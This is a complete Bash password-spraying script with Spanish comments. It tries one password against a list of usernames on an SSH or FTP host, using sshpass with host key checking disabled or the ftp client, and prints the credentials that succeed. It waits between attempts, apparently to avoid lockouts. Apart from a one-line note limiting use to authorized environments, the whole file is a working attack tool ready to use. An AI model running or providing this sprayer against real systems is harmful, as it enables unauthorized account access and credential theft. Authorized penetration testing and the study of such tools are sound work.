#!/usr/bin/env bash
# Password Sprayer (A) – SSH/FTP controlado
# Uso: ./sprayer_a.sh users.txt "Winter2025!" 10.0.0.5 ssh
# Reqs: sshpass (ssh), lftp (ftp) opcional
# ⚠️ Solo en entornos autorizados.

set -euo pipefail
USERS="${1:-}"; PASS="${2:-}"; HOST="${3:-}"; SVC="${4:-ssh}"; DELAY="${DELAY:-2}"

[[ -z "$USERS" || -z "$PASS" || -z "$HOST" ]] && { echo "Uso: $0 <users.txt> <password> <host> [ssh|ftp]"; exit 1; }

attempt_ssh() {
  local u="$1"
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 "$u@$HOST" "exit" &>/dev/null
}

attempt_ftp() {
  local u="$1"
  timeout 5 bash -lc "printf 'user $u $PASS\nquit\n' | ftp -inv $HOST" | grep -qi "logged in"
}

while IFS= read -r u; do
  [[ -z "$u" ]] && continue
  echo "[*] Probando $u@$HOST ($SVC)…"
  if [[ "$SVC" == "ssh" ]]; then
    if attempt_ssh "$u"; then echo "[+] Válido SSH: $u:$PASS"; fi
  else
    if attempt_ftp "$u"; then echo "[+] Válido FTP: $u:$PASS"; fi
  fi
  sleep "$DELAY"
done < "$USERS"
